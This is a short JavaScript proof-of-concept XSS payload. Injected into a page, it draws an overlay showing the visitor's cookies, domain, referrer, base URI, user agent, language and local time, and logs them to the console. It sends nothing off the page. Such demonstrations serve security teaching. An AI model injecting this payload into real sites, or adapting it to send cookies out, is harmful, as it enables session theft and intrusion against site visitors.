const box = document.createElement('div')
box.innerHTML = `
<h3 style="color: white">Browser Info</h3>
    <div>
		<p><strong>This is a proof of concept to show what information can be 
		obtained from a user's browser via a XSS attack.</strong></p>
		<p id="info0"></p>
		<p id="info1"></p>
		<p id="info2"></p>
		<p id="info3"></p>
		<p id="info4"></p>
		<p id="info5"></p>
		<p id="info6"></p>
		<!--<p id="info7"></p>-->
    </div>
  
`;

box.style.position = "fixed";
box.style.top = "70px";
box.style.margin = "0 auto";
box.style.background = "blue";
box.style.padding = "10px";
box.style.zIndex = "99999";
box.style.left = "50%";
box.style.transform = "translateX(-50%)"; // center it
box.style["max-height"] = "40vh"; // % of view height (can't use hyphens)
box.style["overflow-y"] = "scroll";
document.body.appendChild(box);
//document.body.style.overflow = "hidden"; // lock the page scroll

//document.getElementById("info0").innerText = `Base URI: ${document.baseURI}`;

// Browser information (need to add the <p> above)
const arr = [`Base URI: ${document.baseURI}`,
			`Cookies: ${document.cookie}`,
			//`documentURI: ${document.documentURI}`,
			`Domain: ${document.domain}`,
			`Referrer: ${document.referrer}`,
			`Local Date/Time: ${Date().toLocaleString()}`,
			`User Agent: ${navigator.userAgent}`,
			`Browser Language: ${navigator.language}`
			];
			
arr.forEach((item, index) => {
	console.log(item);
	document.getElementById(`info${index}`).innerText = item;
})

document.querySelectorAll("p").forEach(item => {
	item.style.color = "white"
})
